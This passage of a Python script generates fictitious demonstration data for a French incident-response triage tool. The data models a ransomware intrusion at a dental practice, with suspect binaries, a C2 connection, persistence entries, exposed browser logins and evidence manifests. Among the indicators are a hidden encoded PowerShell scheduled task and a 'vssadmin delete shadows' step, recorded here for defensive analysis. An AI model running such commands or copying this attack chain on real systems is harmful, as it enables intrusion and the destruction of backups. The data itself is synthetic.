    acc = [{"Utilisateur": "secretariat", "Source": "LNK (Recent)", "Chemin": "D:\\LOGOS_W\\EXPORT\\export_patients_2026.csv", "Date1": "2026-11-17 00:24:51", "Date1Type": "cible accedee",
            "Date2": "2026-11-17 00:24:51", "Date2Type": "lnk modifie", "Fenetre": "F4", "TSCLIENT": "", "DONNEES_METIER": "OUI", "RESEAU": ""},
           {"Utilisateur": "secretariat", "Source": "ShellBags (UsrClass)", "Chemin": "D:\\LOGOS_W\\DATA", "Date1": "2026-11-17 00:25:30", "Date1Type": "cle modifiee",
            "Date2": "", "Date2Type": "", "Fenetre": "F4", "TSCLIENT": "", "DONNEES_METIER": "OUI", "RESEAU": ""},
           {"Utilisateur": "dr.lilas", "Source": "LNK (Recent)", "Chemin": "D:\\LOGOS_W\\COURRIERS\\[courrier].docx", "Date1": "2026-11-12 21:20:02", "Date1Type": "cible accedee",
            "Date2": "", "Date2Type": "", "Fenetre": "F3", "TSCLIENT": "", "DONNEES_METIER": "OUI", "RESEAU": ""}]
    ecrire(A("acces_fichiers_lnk_jumplists_shellbags.csv"), acc)
    ecrire(A("acces_donnees_metier.csv"), acc)
    ecrire(A("usb_chronologie.csv"), [{"Date": "2026-11-17 14:58:40", "Source": "Partition 1006", "Peripherique": "Kingston DataTraveler 3.0", "Serie": "DEMO0001", "Capacite": "61872793600", "Fenetre": ""},
                                      {"Date": "2026-09-30 09:12:00", "Source": "setupapi (1re installation)", "Peripherique": "USBSTOR\\Disk&Ven_SanDisk&Prod_Cruzer", "Serie": "", "Capacite": "", "Fenetre": ""}])

    # ------------------------------------------------------------ rancon, bases, IOC
    w = col / "rancon"
    w.mkdir(exist_ok=True)
    with open(w / "bases_metier.csv", "w", encoding="utf-8-sig", newline="") as f:
        f.write("Chemin,Taille,Creation,Modification,Acces,Attributs\n")
        for ch, mo, mod in (("D:\\LOGOS_W\\DATA\\PATIENTS.FDB", 2150, "2026-11-16 18:02:11"), ("D:\\LOGOS_W\\DATA\\COMPTA.FDB", 312, "2026-11-16 18:02:11"),
                            ("D:\\LOGOS_W\\SAUVEGARDE\\PATIENTS_20261115.FDB", 2140, "2026-11-15 20:00:00")):
            f.write(f"{ch},{mo * 1048576},2019-03-04 10:00:00,{mod},{mod},Archive\n")
    ecrire(P("rancon\\fichiers_chiffres_par_extension.csv"), [{"Extension": ".DEMOLOCK", "NbFichiers": 48213, "TailleMo": 61240.5, "Premier": "2026-11-17 02:15:04",
                                                               "Dernier": "2026-11-17 02:41:37", "DureeMinutes": 26.6, "Exemple": "D:\\LOGOS_W\\COURRIERS\\[...].docx.DEMOLOCK"}])
    ecrire(P("rancon\\notes_rancon_candidates.csv"), [{"Nom": "LISEZ-MOI-DEMO.txt", "NbDossiers": 1204, "NomEvocateur": "True", "TailleOctets": 2210, "Derniere": "2026-11-17 02:41:40",
                                                       "Exemples": "D:\\LOGOS_W\\LISEZ-MOI-DEMO.txt | C:\\Users\\Public\\LISEZ-MOI-DEMO.txt"}])
    ecrire(P("rancon\\binaires_suspects.csv"), [{"Chemin": f"C:\\Users\\Public\\Music\\{n}.exe", "TailleKo": R.randint(200, 30000), "Creation": "2026-11-16 23:45:00", "Modification": "2026-11-16 23:45:00",
                                                 "SHA256": SHA[n], "Signature": "NotSigned", "Signataire": "", "Source": "Dossier a risque", "Archive": "True"} for n in ("rclone", "netscan", "netpass", "svhost")])
    ecrire(P("fichiers\\outils_suspects.csv"), [{"Chemin": f"C:\\Users\\Public\\Music\\{n}.exe", "TailleKo": R.randint(200, 30000), "Creation": "2026-11-16 23:45:00",
                                                 "Modification": "2026-11-16 23:45:00", "SHA256": SHA[n]} for n in ("rclone", "netscan", "netpass")])
    ecrire(A("ioc_hachages.csv"), [{"Nom": f"{n}.exe", "Chemin": f"C:\\Users\\Public\\Music\\{n}.exe", "SHA256": SHA[n], "SHA1": "", "Source": "Fichier present (outils_suspects)", "Date": "2026-11-16 23:45:00", "Remarque": ""}
                                   for n in ("rclone", "netscan", "netpass", "svhost")]
           + [{"Nom": f"{n}.exe", "Chemin": f"c:\\users\\public\\music\\{n}.exe", "SHA256": "", "SHA1": SHA1[n], "Source": "Amcache (SHA1 du fichier execute / inventorie)", "Date": "2026-11-17 00:41:29", "Remarque": ""}
              for n in ("rclone", "netscan", "netpass", "svhost")]
           + [{"Nom": "HackTool:Win32/Mimikatz.D", "Chemin": "C:\\Users\\Public\\Music\\mimi.exe", "SHA256": "", "SHA1": SHA1["mimi"], "Source": "Quarantaine Defender (nom = SHA1 d'origine)",
               "Date": "2026-11-16 23:52:40", "Remarque": "rapprochement par horodatage (+/- 2 min) avec 1116/1117 : 1 detection(s)"}])
    ecrire(P("volatile\\tcp_connexions.csv"), [
        {"LocalAddress": "192.168.1.31", "LocalPort": "50122", "RemoteAddress": C2, "RemotePort": "443", "State": "Established", "OwningProcess": "6120", "CreationTime": "2026-11-17 02:05:12",
         "TypeIP": "PUBLIQUE", "Process": "svhost.exe", "Path": "C:\\Users\\Public\\Music\\svhost.exe", "CommandLine": "svhost.exe -k demo"},
        {"LocalAddress": "192.168.1.31", "LocalPort": "50340", "RemoteAddress": "192.0.2.250", "RemotePort": "443", "State": "Established", "OwningProcess": "4410", "CreationTime": "2026-11-17 14:20:00",
         "TypeIP": "PUBLIQUE", "Process": "chrome.exe", "Path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": ""}])
    ecrire(P("volatile\\processus_binaires.csv"), [{"Path": "C:\\Users\\Public\\Music\\svhost.exe", "SHA256": SHA["svhost"], "Signature": "NotSigned", "Signataire": ""},
                                                   {"Path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "SHA256": hashlib.sha256(b"chrome").hexdigest().upper(), "Signature": "Valid", "Signataire": "CN=Google LLC"}])
    ecrire(P("persistance\\services.csv"), [{"Name": "DemoSvcHost", "DisplayName": "Demo Service Host", "State": "Running", "StartMode": "Auto", "StartName": "LocalSystem",
                                             "PathName": "C:\\Users\\Public\\Music\\svhost.exe -k demo", "Description": ""}])
    ecrire(P("persistance\\taches_planifiees.csv"), [{"Nom de l'hote": "SECRETARIAT-01", "Nom de la tache": "\\MicrosoftEdgeUpdateTaskDemo", "Prochaine execution": "N/A", "Statut": "Pret",
                                                      "Tache a executer": "powershell.exe -w hidden -enc ZABlAG0AbwA=", "Auteur": "SECRETARIAT-01\\support"}])
    ecrire(P("exposition\\identifiants_navigateurs.csv"), [
        {"Utilisateur": "secretariat", "Navigateur": "chrome", "Profil": "Default", "Fichier": "Login Data", "Site": "https://pro.doctolib.example/", "Identifiant": "secretariat@cabinet-lilas.example",
         "Cree": "2024-02-01 09:00:00", "DerniereUtilisation": "2026-11-16 08:52:00", "NbUtilisations": "512", "JamaisEnregistre": "False"},
        {"Utilisateur": "secretariat", "Navigateur": "chrome", "Profil": "Default", "Fichier": "Login Data", "Site": "https://espacepro.ameli.example/", "Identifiant": "secretariat@cabinet-lilas.example",
         "Cree": "2023-05-12 09:00:00", "DerniereUtilisation": "2026-11-14 10:12:00", "NbUtilisations": "201", "JamaisEnregistre": "False"},
        {"Utilisateur": "secretariat", "Navigateur": "chrome", "Profil": "Default", "Fichier": "Login Data", "Site": "https://mail.cabinet-lilas.example/", "Identifiant": "dr.lilas@cabinet-lilas.example",
         "Cree": "2022-09-03 09:00:00", "DerniereUtilisation": "2026-11-16 17:40:00", "NbUtilisations": "1044", "JamaisEnregistre": "False"},
        {"Utilisateur": "secretariat", "Navigateur": "edge", "Profil": "Default", "Fichier": "Login Data", "Site": "https://banque.example/", "Identifiant": "8812345",
         "Cree": "2021-01-10 09:00:00", "DerniereUtilisation": "2026-11-02 11:00:00", "NbUtilisations": "88", "JamaisEnregistre": "False"}])
    ecrire(P("exposition\\comptes_a_changer.csv"), [
        {"Utilisateur": "secretariat", "Site": "banque.example", "NbIdentifiants": "1", "Identifiants": "8812345", "Navigateurs": "edge"},
        {"Utilisateur": "secretariat", "Site": "espacepro.ameli.example", "NbIdentifiants": "1", "Identifiants": "secretariat@cabinet-lilas.example", "Navigateurs": "chrome"},
        {"Utilisateur": "secretariat", "Site": "mail.cabinet-lilas.example", "NbIdentifiants": "1", "Identifiants": "dr.lilas@cabinet-lilas.example", "Navigateurs": "chrome"},
        {"Utilisateur": "secretariat", "Site": "pro.doctolib.example", "NbIdentifiants": "1", "Identifiants": "secretariat@cabinet-lilas.example", "Navigateurs": "chrome"}])

    # ------------------------------------------------------------ grille et textes
    grille = [("Volumes reseau (SRUM)", "INDICE", "F4 : 1 751 Mo envoyes par rclone.exe entre 00:41 et 02:00 (max de reference : 39 Mo/h)", "srum_fenetres_vs_reference.csv"),
              ("Executions pendant les fenetres", "INDICE", "F4 : netscan, mimi.exe (mimikatz), netpass, 7z, rclone, svhost.exe", "executions_fenetres.csv"),
              ("Mimikatz (execution, perimetre des identifiants)", "INDICE", "Execution de mimikatz tracee (Prefetch MIMI.EXE 00:03) : identifiants de tous les comptes du poste a considerer comme compromis", "identifiants_exposition.txt"),
              ("Archives creees pendant les fenetres", "INDICE", "b.7z cree a 00:27 dans C:\\Users\\Public\\Music (USN)", "usn_fenetres.csv"),
              ("Consultation des donnees metier (Axilog / base) avant chiffrement", "INDICE", "3 trace(s) d'acces aux donnees metier, dont 2 datee(s) dans les fenetres de l'attaquant", "acces_donnees_metier.csv"),
              ("Navigation web", "A LIRE", "F4 : Doctolib (agenda, patients), rclone.org, mega.nz", "navigation_fenetres.csv"),
              ("Couverture des journaux", "A LIRE", "2 journal(aux) ne couvrent pas toutes les fenetres (rotation, journal recent) : absence d'evenement non probante", "journaux_couverture.csv"),
              ("Gestionnaire d'identifiants (cibles hors serveur)", "A FAIRE", "1 compte(s) avec entrees ; netpass EXECUTE : identifiants reseau / RDP exposes. Cibles a lister avec cmdkey.", "identifiants_exposition.txt"),
              ("Journal du pare-feu", "NON VERIFIABLE", "Journalisation du pare-feu desactivee sur les 3 profils", "parefeu_fenetres.csv"),
              ("Partages SMB (5140 / 5145)", "NON VERIFIABLE", "Audit des partages non active", "partages_acces_5140_5145.csv"),
              ("Requetes DNS", "NON VERIFIABLE", "Journal DNS-Client desactive", "dns_requetes_fenetres.csv"),
              ("USB pendant les fenetres", "RAS", "Aucun peripherique USB branche pendant les fenetres (seule la cle de collecte, 14:58)", "usb_chronologie.csv"),
              ("BITS", "RAS", "Aucun transfert BITS pendant les fenetres", "bits_evenements.csv")]
    ecrire(A("grille_verification.csv"), [{"Canal": a, "Statut": b, "Constat": c, "Fichier": f} for a, b, c, f in grille])
    (col / "SYNTHESE.txt").write_text(
        "SYNTHESE DE LA COLLECTE - SECRETARIAT-01 (DONNEES FICTIVES DE DEMONSTRATION)\n\n"
        "[!] Chiffrement detecte : 48213 fichiers .DEMOLOCK en 26,6 min (17/11 02:15 -> 02:41)\n"
        "[!] Note de rancon : LISEZ-MOI-DEMO.txt dans 1204 dossiers\n"
        "[!] Cliches VSS supprimes (vssadmin delete shadows, 02:12)\n"
        f"[!] IP publique avec connexion RDP reussie : {ATT} (secretariat, 16/11 23:42)\n"
        "[!] Force brute : 6 864 echecs depuis 18 IP\n[!] Defender : HackTool:Win32/Mimikatz.D (23:52)\n"
        "[!] Compte cree pendant l'intrusion : support (ajoute aux Administrateurs)\n", encoding="utf-8")
    (ana / "SYNTHESE_EXFILTRATION.txt").write_text("SYNTHESE EXFILTRATION (DEMONSTRATION)\nGrille de verification, pas une conclusion. Voir grille_verification.csv.\n", encoding="utf-8")
    (col / "A_COMPLETER_TECHNICIEN.txt").write_text(
        "Incident (necessaire a la notification CNIL : le delai de 72 h court a partir de la DECOUVERTE)\n"
        "  [x] Date et heure de decouverte : 17/11/2026 a 08:10   par : secretaire (ecran de rancon)\n"
        "  [x] Logiciel metier et base(s) concernee(s) : Logos_w (demo)\n"
        "  [ ] Nombre estime de PATIENTS dans la base (pas de fichiers) : ________\n", encoding="utf-8")
    (col / "infos_collecte.txt").write_text(
        "Poste            : SECRETARIAT-01 (DEMONSTRATION)\r\nMode             : complet\r\nDomaine          : CABINET\r\nLance par        : SECRETARIAT-01\\tech-msp\r\n"
        "Technicien       : Camille Martin\r\nSociete          : MSP Démo\r\nCabinet          : Cabinet Dentaire des Lilas (demo)\r\nPresent          : Dr Durand, praticienne\r\nTicket           : T-2026-1142\r\nMotif            : Intrusion ou prise en main à distance\r\n"
        "Administrateur   : True\r\nDate locale      : 2026-11-17 14:41:03 +01:00\r\nDate UTC         : 2026-11-17 13:41:03\r\nFuseau           : Romance Standard Time\r\n"
        "Version script   : 2.2\r\nVelociraptor     : SHA256 0D3C1A7E5B9F2468ACE13579BDF02468ACE13579BDF02468ACE13579BDF0246A (demo)\r\n", encoding="utf-8")
    (col / "exposition").mkdir(exist_ok=True)
    (col / "exposition" / "wifi_profils.txt").write_text("    Profil Tous les utilisateurs : CABINET-LILAS\n    Profil Tous les utilisateurs : Livebox-DEMO\n", encoding="utf-8")

    # ------------------------------------------------------------ manifeste
    for racine, nom in ((col, "manifeste_sha256.csv"), (ana, "manifeste_analyse_sha256.csv")):
        lignes = []
        for p in sorted(racine.rglob("*")):
            if p.is_file() and p.name != nom:
                lignes.append({"Fichier": str(p.relative_to(racine)).replace("/", "\\"), "Taille": p.stat().st_size,
                               "SHA256": hashlib.sha256(p.read_bytes()).hexdigest().upper()})
        ecrire(racine / nom, lignes)

    # ------------------------------------------------------------ journaux et PV de copie (hors manifeste, comme dans la vraie collecte)
    (col / "collecte.log").write_text("2026-11-17 14:41:03  === Collecte de triage v2.2 (complet) sur SECRETARIAT-01 ===\r\n"
                                      "2026-11-17 14:41:03  [*] Volatile : processus, connexions TCP\r\n2026-11-17 14:58:40  [*] Memoire vive (winpmem)\r\n"
                                      "2026-11-17 15:01:21  [*] Calcul du manifeste SHA256 des elements collectes\r\n"
                                      "2026-11-17 15:03:02  === Collecte terminee en 21 min 59 s - 4211.6 Mo dans E:\\Collecte\\SECRETARIAT-01_20261117_150121 ===\r\n", encoding="utf-8")
    (ana / "analyse.log").write_text("2026-11-17 16:20:10  === Analyse orientee exfiltration v2.2 ===\r\n2026-11-17 16:47:55  === Analyse terminee en 27 min 45 s ===\r\n", encoding="utf-8")
    (col / "PV_COPIE_20261117_173500.txt").write_text(
        "PROCES-VERBAL DE COPIE DE PREUVES\r\n=================================================================\r\n"
        "Date / heure     : 2026-11-17 17:35:00 +01:00\r\nOperateur        : MSP-DEMO\\technicien\r\nPoste de copie   : PC-ANALYSE-DEMO\r\n"
        "Source           : E:\\Collecte\\SECRETARIAT-01_20261117_150121\r\nDestination      : F:\\Scelles\\SECRETARIAT-01_20261117_150121\r\n"
        "Support          : DEMO-SAUV (NTFS), n. de serie de volume 1A2B3C4D\r\nFichiers         : 1 204 (4 416 120 832 octets)\r\n"
        "Verification     : SHA256 de chaque fichier source et copie ; comparaison aux manifestes de collecte (1 203 empreintes)\r\n"
        "Resultat         : toutes les copies sont identiques aux originaux\r\n", encoding="utf-8")

    import os as _os
    for f_, d_ in ((col / "manifeste_sha256.csv", "2026-11-17 15:02:40"), (col / "collecte.log", "2026-11-17 15:03:02"),
                   (ana / "manifeste_analyse_sha256.csv", "2026-11-17 16:47:50"), (ana / "analyse.log", "2026-11-17 16:47:55"), (col / "PV_COPIE_20261117_173500.txt", "2026-11-17 17:35:20")):
        t_ = d(d_).timestamp()
        _os.utime(f_, (t_, t_))

    # ------------------------------------------------------------ seconde collecte (autre client) pour la memoire des incidents
    autre = RACINE / "ACCUEIL-02_20261009_101500"
    (autre / "connexions").mkdir(parents=True)
    (autre / "SYNTHESE.txt").write_text("Collecte fictive (demonstration) - autre cabinet\n", encoding="utf-8")
    ecrire(autre / "connexions" / "synthese_ip_connexions_reussies.csv", [{"IP": ATT, "TypeIP": "PUBLIQUE", "NbEvenements": 3, "Premier": "2026-10-08 01:10:00",
                                                                           "Dernier": "2026-10-08 01:10:05", "Sources": "4624 type 10", "Comptes": "CABINET2\\accueil"}])
    ecrire(autre / "rancon" / "binaires_suspects.csv", [{"Chemin": "C:\\Users\\Public\\Music\\rclone.exe", "SHA256": SHA["rclone"], "Signature": "NotSigned", "Source": "Dossier a risque", "Creation": "2026-10-08 01:20:00"}])

    # ------------------------------------------------------------ bases de demo (ce que le .bat telecharge en vrai)
    BASES.mkdir(parents=True, exist_ok=True)
    with gzip.open(BASES / "ip2asn-combined.tsv.gz", "wt", encoding="utf-8") as g:
        for a, b, asn, cc, lib in GEO:
            g.write(f"{a}\t{b}\t{asn}\t{cc}\t{lib}\n")
    with gzip.open(BASES / "dbip-city-ipv4.csv.gz", "wt", encoding="utf-8") as g:
        for a, b, asn, cc, lib in GEO:
            v, la, lo = VILLES[asn]
            g.write(f"{a},{b},{cc},,,{v},,{la},{lo},\n")
    (BASES / "ip_tor.txt").write_text("# Demo - noeuds de sortie Tor (fictif)\n203.0.113.40\n203.0.113.41\n", encoding="utf-8")
    (BASES / "ip_blocklistde.txt").write_text("# Demo - blocklist.de (fictif)\n" + "\n".join(ip for ip, n in BRUTE[:12]) + "\n203.0.113.170\n", encoding="utf-8")
    (BASES / "ip_firehol1.txt").write_text("# Demo - FireHOL level 1 (fictif)\n203.0.113.64/27\n192.0.2.0/26\n", encoding="utf-8")
    (BASES / "ransomware_live_FR.json").write_text(json.dumps([
        {"victim": "Cabinet Dentaire des Lilas (DEMO)", "group": "demolocker", "discovered": "2026-11-18 06:12:00", "country": "FR", "domain": "cabinet-lilas.example",
         "url": "https://www.ransomware.live/", "description": "Fictitious demo record"},
        {"victim": "Autre Victime Fictive SARL", "group": "demolocker", "discovered": "2026-11-02 10:00:00", "country": "FR", "domain": "autre.example"}], ensure_ascii=False), encoding="utf-8")
    (BASES / "memoire_incidents.json").write_text(json.dumps({"ACCUEIL-02_20261009_101500": {
        "poste": "ACCUEIL-02", "date": "2026-10-09 10:15:00", "client": "Cabinet medical du Port (demo)",
        "ip": [ATT], "sha256": [SHA["rclone"]], "sha1": [], "fichiers": ["rclone.exe"]}}, ensure_ascii=False), encoding="utf-8")
    (RACINE / (POSTE + "_reglages.json")).write_text(json.dumps({
        "client": "Cabinet Dentaire des Lilas (demo)", "decouverte": "2026-11-17 08:10", "technicien": "BH", "debit_montant_mbps": 40, "compression": 4,
        "mots_cles_fuite": ["Cabinet Dentaire des Lilas", "cabinet-lilas.example"],
        "liste_blanche": [{"valeur": "100.64.0.0/10", "note": "VPN du prestataire (techniciens)"}]}, ensure_ascii=False, indent=1), encoding="utf-8")
    return col


if __name__ == "__main__":
    print(generer(force=True))
